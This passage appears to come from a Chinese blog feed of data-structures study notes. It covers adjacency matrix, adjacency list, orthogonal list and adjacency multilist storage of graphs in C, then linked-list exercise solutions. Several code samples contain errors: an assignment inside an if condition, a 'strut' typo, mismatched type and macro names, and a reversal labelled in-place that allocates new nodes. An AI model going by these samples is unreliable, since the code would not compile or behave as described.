如果&lt;v_i,v_j&gt;∈E或者(v_i,v_j)∈VR\\∞, 无边（弧）\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">如果</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord cjk_fallback">或者</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">∞</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">无边（弧）</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p></li><li><p>优缺点：</p><ul><li><p>优：容易实现图的操作，如：求某顶点的<strong>度</strong>、判断顶点之间<strong>是否有边</strong>、<strong>找顶点的邻接</strong>点等等</p></li><li><p>缺：n个顶点需要<strong>n*n</strong>个单元存储边;<strong>空间效率为O(n^2^ )</strong>。对稀疏图而言尤其浪费空间</p><p>​        不便千增加和删除顶点</p><p>​        不便千统计边的数目，需要扫描邻接矩阵所有元素才能统计完毕，时间复杂度为O(n^2^)</p></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//用两个数组分别存储顶点表和临界矩阵</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767         <span class="hljs-comment">//表示极大值，∞</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100 <span class="hljs-comment">//最大顶点数</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VexTexType; <span class="hljs-comment">//假设顶点的数据类型为字符型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType; <span class="hljs-comment">//假设便的权值类型为整型</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    VerTexType vex[MvNum];    <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum]; <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum,arcnum;<span class="hljs-comment">//图的当前点数和边数</span><br>&#125;AMGraph;<br></code></pre></td></tr></table></figure><h4 id="采用邻接矩阵表示法创建无向网G，时间复杂度：O-n-2">采用邻接矩阵表示法创建无向网G，时间复杂度：O(n^2^)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C">Status <span class="hljs-title function_">CreateUDN</span><span class="hljs-params">(AMGraph &amp;G)</span>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;G.vexnum&gt;&gt;G.arcnum;        <span class="hljs-comment">//①输入总顶点数</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;G.vexnum;i++)<span class="hljs-comment">//②依次输入顶点信息存入顶点表中</span><br>        <span class="hljs-built_in">cin</span>&gt;&gt;G.vex[i];<br>    <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;G.vexnum;i++)<span class="hljs-comment">//③初始化邻接矩阵，边的权值均置为极大值</span><br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;G.vexnum;j++)<br>            G.arcs[i][j]=MaxInt;<br>    <br>    <span class="hljs-keyword">for</span>(k=<span class="hljs-number">0</span>;k&lt;G.arcnum;k++)&#123;<span class="hljs-comment">//④构造邻接矩阵</span><br>        <span class="hljs-built_in">cin</span>&gt;&gt;v1&gt;&gt;v2&gt;&gt;w;<span class="hljs-comment">//输入一条边依附的顶点及权值</span><br>        i=LocateVex(G,v1);<span class="hljs-comment">//确定v1和v2在G中的位置</span><br>        j=LocateVex(G,v2);<br>        G.arcs[i][j]=w;<span class="hljs-comment">//边&lt;v1,v2&gt;的权值置为w</span><br>        G.arcs[j][i]=G.arcs[i][j];  <span class="hljs-comment">//对称边的设置</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> ok;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="定位">定位</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">LocateVex</span><span class="hljs-params">(AMGraph G,VexTexType u)</span><br>&#123;<span class="hljs-comment">//存在则返回u在顶点表中的下标;否则返回-1</span><br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;G.vexnum;++i)<br><span class="hljs-keyword">if</span>(u==G.vex[i])<br><span class="hljs-keyword">return</span> i;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="邻接表-的存储表示">==邻接表==的存储表示</h6><ul><li><p>数组表示法不适合存储稀疏图，提出邻接表表示法（链式）</p></li><li><p>对每个<strong>顶点v~i~</strong> 建立一个单链表，把与vi有关联（依附于v~i~)的<strong>边</strong>的信息链接起来。该单链表中每个结点设为3个域(邻接点域[adjvex]，链域[nextarc]，数据域[info])；</p></li><li><p>每个单链表有一个<strong>头结点</strong>（设为2个域），存v~i~信息；</p></li><li><p>每个单链表的头结点<strong>另外用顺序存储</strong>结构存储。</p></li><li><p><strong>空间效率</strong>为<strong>O(n+2e)</strong>。 若是稀疏图(e&lt;&lt;n2)，比邻接矩阵表示法O(n^2^)省空间。</p></li><li><p>对于<strong>无向图</strong>TD(Vi)=<strong>单链表</strong>中链接的<strong>结点</strong>个数</p></li><li><p>对于<strong>有向图</strong>： OD(Vi)＝单链出边表（邻接表）中链接的结点数</p><p>​ ID(Vi)＝<strong>邻接点域</strong>（出现在其他链表中）为Vi的弧个数</p><p>​ TD(Vi) = OD( Vi ) + ID( Vi )</p></li><li><p>优缺点：</p><ul><li><p>优：<strong>空间效率高</strong>，容易寻找顶点的<strong>邻接点</strong>；</p></li><li><p>缺：判断两顶点间是否有边或弧，需搜索两结点对应的单链表，没有邻接矩阵方便。</p><p>​对于无向图而言，邻接则增节点，导致每条边都要存储两遍（解决：采用邻接多重表）</p><p>​对于有向图而言，链表仅存出边或入边的相关结点，导致求结点的度困难（解决：采用十字链表）</p></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100 <span class="hljs-comment">//最大顶点数</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ArcNode</span>&#123;</span> <span class="hljs-comment">//边结点</span><br><span class="hljs-type">int</span> adjvex; <span class="hljs-comment">//该边所指向的顶点的位置</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ArcNode</span> * <span class="hljs-title">nextarc</span>;</span> <span class="hljs-comment">//指向下一条边的指针</span><br>OtherInfo info; <span class="hljs-comment">//和边相关的信息</span><br>&#125;ArcNode; <br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VNode</span>&#123;</span> <br>VerTexType data; <span class="hljs-comment">//顶点信息</span><br>ArcNode * firstarc; <span class="hljs-comment">//指向第一条依附该顶点的边的指针</span><br>&#125;VNode, AdjList[MVNum]; <span class="hljs-comment">//AdjList表示邻接表类型</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span> <br>    AdjList vertices; <span class="hljs-comment">//邻接表 ，等价于 VNode vertices[MVNum] </span><br>    <span class="hljs-type">int</span> vexnum, arcnum; <span class="hljs-comment">//图的当前顶点数和边数</span><br>&#125;ALGraph; <br></code></pre></td></tr></table></figure><h4 id="用邻接表表示法创建无向网">用邻接表表示法创建无向网</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C">Status <span class="hljs-title function_">CreateUDG</span><span class="hljs-params">(ALGraph &amp;G)</span>&#123; <br>        <span class="hljs-comment">//采用邻接表表示法，创建无向图G </span><br>        <span class="hljs-built_in">cin</span>&gt;&gt;G.vexnum&gt;&gt;G.arcnum; <span class="hljs-comment">//①输入总顶点数，总边数</span><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i&lt;G.vexnum; ++i)&#123; <span class="hljs-comment">//②输入各点，构造表头结点表</span><br>            <span class="hljs-built_in">cin</span>&gt;&gt;G.vertices[i].data; <span class="hljs-comment">//②输入顶点值</span><br>            G.vertices[i].firstarc=<span class="hljs-literal">NULL</span>; <span class="hljs-comment">//②初始化表头结点的指针域为NULL </span><br>&#125;<br>    <br><span class="hljs-keyword">for</span>(k = <span class="hljs-number">0</span>; k&lt;G.arcnum;++k)&#123; <span class="hljs-comment">//输入各边，③构造邻接表</span><br>        <span class="hljs-built_in">cin</span>&gt;&gt;v1&gt;&gt;v2; <span class="hljs-comment">//输入一条边依附的两个顶点</span><br>        i = LocateVex(G, v1); j = LocateVex(G, v2); <br>        p1=new ArcNode; <span class="hljs-comment">//生成一个新的边结点*p1 </span><br>        p1-&gt;adjvex=j; <span class="hljs-comment">//邻接点序号为j </span><br>        p1-&gt;nextarc= G.vertices[i].firstarc; G.vertices[i].firstarc=p1; <br>        <span class="hljs-comment">//将新结点*p1插入顶点vi的边表头部 （头插法）</span><br>        p2=new ArcNode; <span class="hljs-comment">//生成另一个对称的新的边结点*p2 </span><br>        p2-&gt;adjvex=i; <span class="hljs-comment">//邻接点序号为i </span><br>        p2-&gt;nextarc= G.vertices[j].firstarc; G.vertices[j].firstarc=p2; <br>        <span class="hljs-comment">//将新结点*p2插入顶点vj的边表头部</span><br>    &#125;<span class="hljs-comment">//for </span><br>    <span class="hljs-keyword">return</span> OK; <br>&#125;<span class="hljs-comment">//CreateUDG</span><br></code></pre></td></tr></table></figure><h3 id="邻接矩阵与邻接表表示法的关系">邻接矩阵与邻接表表示法的关系</h3><ul><li><p>联系：邻接表中每个链表对应 于邻接矩阵中的一行，链表中结点个数等于一行中非零元素 的个数。</p></li><li><p>区别：</p><p>​① 对于任一确定的无向图，邻接矩阵是唯一的（行列号与顶点编号一致，但邻接表不唯一（链接次序与顶点编号无关）。</p><p>​② 邻接矩阵的空间复杂度为O(n^2),而邻接 表的空间复杂度为O(n+e)。</p></li><li><p>用途：邻接矩阵多用于稠密图，而邻接表多用于稀疏图</p></li></ul><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">时间效率</th><th style="text-align:center">空间效率</th></tr></thead><tbody><tr><td style="text-align:center">邻接矩阵</td><td style="text-align:center">O(n^2^)</td><td style="text-align:center">O(n^2^)</td></tr><tr><td style="text-align:center">邻接表</td><td style="text-align:center">O(n+e)</td><td style="text-align:center">O(n+2e)</td></tr></tbody></table><h6 id="十字链表-Orthogonal-List">十字链表(Orthogonal List)</h6><ul><li><p>十字链表是<strong>有向图</strong>的另一种链式存储结构是将有向图的正邻接表和逆邻接表结合起来得到的一种链表。</p></li><li><p>在这种结构中，每条弧的弧头结点和弧尾结点都存放在链表中，并将弧结点分别组织到以弧尾结点为头结点(顶点)和以弧头结点为头结点(顶点)的链表中。</p></li><li><p>若将有向图的邻接矩阵看成是稀疏矩阵的话，则十字链表也可以看成是邻接矩阵的链表存储结构</p></li><li><p>在图的十字链表中，弧结点所在的链表非循环链表，结点之间相对位置自然形成，不一定按顶点序号有序，表头结点即<strong>顶点结点</strong>，它们之间不是链接，而是<strong>顺序存储</strong>。</p></li><li><p>弧结点</p><table><thead><tr><th style="text-align:center">tailvex</th><th style="text-align:center">headvex</th><th style="text-align:center">hlink</th><th style="text-align:center">tlink</th><th style="text-align:center">info</th></tr></thead></table><p>tailvex：尾域，指示弧尾顶点在图中的位置</p><p>headvex：头域，指示弧头顶点在图中的位置</p><p>hlink：指向弧头相同的下一条弧</p><p>tlink：指向弧尾相同的下一条弧</p><p>info：指向该弧的相关信息</p><p>弧头相同的弧在同一链表上，弧尾相同的弧也在同一链表上，它们的头结点即为顶点结点</p></li><li><p>顶点结点</p><table><thead><tr><th style="text-align:center">data</th><th style="text-align:center">firstin</th><th style="text-align:center">firstout</th></tr></thead></table><p>data：存储和顶点相关的信息</p><p>firstin：指向以该顶点为弧头的第一个弧结点</p><p>firstout：指向以该顶点为弧尾的第一个弧结点</p></li><li><p>:eyes:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//- - - - -有向图的十字链表存储表示－ －－－－</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ VERTEX_NUM 20 </span><br><span class="hljs-keyword">typedef</span> strut ArcBox&#123; <br><span class="hljs-type">int</span> tailvext,headvex; <span class="hljs-comment">//该弧的尾和头顶点的位置</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ArcBox</span> *<span class="hljs-title">hlink</span>, *<span class="hljs-title">tlink</span>;</span> <span class="hljs-comment">//分别为弧头相同和弧尾相同的弧的链域</span><br>InfoType *info; <span class="hljs-comment">//该弧相关信息的指针</span><br>&#125; ArcBox; <br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VexNode</span>&#123;</span><br>VertexType data; <br>ArcBox *firstin,*firstout; <span class="hljs-comment">//分别指向该顶点第一条人弧和出弧</span><br>&#125;VexNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span> <br>VexNode xlist[MAX_VERTEX_NUM]; <span class="hljs-comment">//表头向量</span><br><span class="hljs-type">int</span> vexnnm, arcnum; <span class="hljs-comment">//有向图的当前顶点数和弧数</span><br>&#125;OLGraph;<br></code></pre></td></tr></table></figure></li></ul><h6 id="邻接多重表-Adjacency-Multilist">邻接多重表 (Adjacency Multilist)</h6><ul><li><p>邻接多重表(Adjacency Multilist)是<strong>无向图</strong>的另一种链式存储结构</p></li><li><p>邻接表是无向图的一种有效的存储结构，很容易求得<strong>顶点和边的信息</strong>。但在邻接表中每一条边有两个结点，分别在第 i 个和第 j 个链表中，在涉及到<strong>边的操作</strong>会带来不便（例如：删除边要重复两次）</p></li><li><p>邻接多重表的结构和十字链表类似，每条边用一个结点表示；邻接多重表中的顶点结点结构与邻接表中的完全相同</p></li><li><p>边结点</p><table><thead><tr><th style="text-align:center">mark</th><th style="text-align:center">ivex</th><th style="text-align:center">ilink</th><th style="text-align:center">jvex</th><th style="text-align:center">jlink</th><th style="text-align:center">info</th></tr></thead></table><p>mark：标志域，用以标记该边是否被搜索过</p><p>ivex、jvex：该边依附的两个顶点在图中的位置</p><p>ilink：指向下一条依附于顶点 ivex 的边</p><p>jlink：指向下一条依附于顶点 jvex 的边</p><p>info：指向和边相关的各种信息的指针域</p></li><li><p>顶点结点</p><table><thead><tr><th style="text-align:center">data</th><th style="text-align:center">firstedge</th></tr></thead></table><p>data：存储和该顶点相关的信息</p><p>firstedge：指示第一条依附于该顶点的边</p></li><li><p>:eyes:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//- - - - -无向图的邻接多重表存储表示－－－－－</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTEX_NUM 20</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span>&#123;</span>unvisited,visited&#125; Visitlf;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EBox</span></span><br><span class="hljs-class">&#123;</span><br>    Visitlf mark; <span class="hljs-comment">//访问标记</span><br><span class="hljs-type">int</span> ivex, jvex; <span class="hljs-comment">//该边依附的两个顶点位置</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EBox</span> *<span class="hljs-title">ilink</span>, *<span class="hljs-title">jlink</span>;</span> <span class="hljs-comment">//分别指向依附这两个顶点的下一条边</span><br>InfoType *info; <span class="hljs-comment">//该边信息指针</span><br>&#125;Ebox; <br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VexBox</span> </span><br><span class="hljs-class">&#123;</span> <br>VertexType data; <br>EBox *firstedge; <span class="hljs-comment">//指向第一条依附该结点的边</span><br>&#125;VexBox; <br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span> <br>VexBox adjmulist[MAX_VERTEX_NUM]; <br><span class="hljs-type">int</span> vexnum, edgenum; <span class="hljs-comment">//无向图的当前顶点数和边数</span><br>&#125;AMLGraph; <br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>code-顺序表</title>
    <link href="/2022/02/18/code-%E9%A1%BA%E5%BA%8F%E8%A1%A8/"/>
    <url>/2022/02/18/code-%E9%A1%BA%E5%BA%8F%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1>1、</h1><p>从顺序表中找到具有最小值的元素（假设唯一）并由函数返回该元素的值。然后将该元素 用最后一个元素进行替换，并删除最后一个元素，若顺序表为空则显示出错信息并退出运行。</p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">Del_Min</span><span class="hljs-params">(sqList&amp; L, <span class="hljs-type">int</span>&amp; value)</span> &#123;<br><span class="hljs-keyword">if</span> (L.length == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入顺序表为空&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-2</span>);<br>&#125;<br>value = L.elem[<span class="hljs-number">0</span>];<br><span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; L.length; i++) &#123;<br><span class="hljs-keyword">if</span> (L.elem[i] &lt; value) &#123;<br>value = L.elem[i];<br>num = i;<br>&#125;<br>&#125;<br>L.elem[num] = L.elem[--L.length];<br><span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure><h1>2、</h1><p>编写算法实现带头结点的单链表的就地逆置，所谓“就地”是指辅助空间复杂度为 O（1）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C">linklist <span class="hljs-title function_">Reverse</span><span class="hljs-params">(linklist&amp; L)</span> &#123;<br><span class="hljs-keyword">if</span> (L-&gt;next = <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入链表为空&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-2</span>);<br>&#125;<br>linklist p = L;<br>linklist q;<br>createlist(q);<br>q-&gt;next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">while</span> (p-&gt;next!=<span class="hljs-literal">NULL</span>) &#123;<br>p = p-&gt;next;<br>linklist r = new node;<br>r-&gt;data = p-&gt;data;<br>r-&gt;next = q-&gt;next;<br>q-&gt;next = r;<br><br>&#125;<br><span class="hljs-keyword">return</span> q;&#125;<br></code></pre></td></tr></table></figure><h1>3、</h1><p>设 A 和 B 是两个单链表（带头结点），其中元素递增有序。设计一个算法从 A 和 B 中公共 元素产生单链表 C，要求不破坏 A 和 B 的结点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C">linklist <span class="hljs-title function_">Get_Common</span><span class="hljs-params">(linklist A, linklist B)</span> &#123;<br>linklist C = new node;<br>createlist(C);<br>linklist p = A;<br>linklist q = B;<br><span class="hljs-keyword">while</span> (p-&gt;next) &#123;<br>p = p-&gt;next;<br><span class="hljs-keyword">if</span> (seek(q, p-&gt;data)==<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">if</span> (seek(C, p-&gt;data) != <span class="hljs-number">1</span>) &#123;<br>linklist r = new node;<br>r-&gt;data = p-&gt;data;<br>r-&gt;next = C-&gt;next;<br>C-&gt;next = r;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h1>4、</h1><p>现有非空单链表 A 和 B，均表示非负整数。A 和 B 的每位数字均采用逆序方式进行存储， 并且每个节点只能存储一位数字。请编写程序将 A 和 B 相加，并以相同形式返回一个表示 和的单链表。假定除了数字 0 以外，A 和 B 都不会以 0 开头。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> ListNode* <span class="hljs-title function_">addTwoNumbers</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ListNode* l1, <span class="hljs-keyword">struct</span> ListNode* l2)</span> 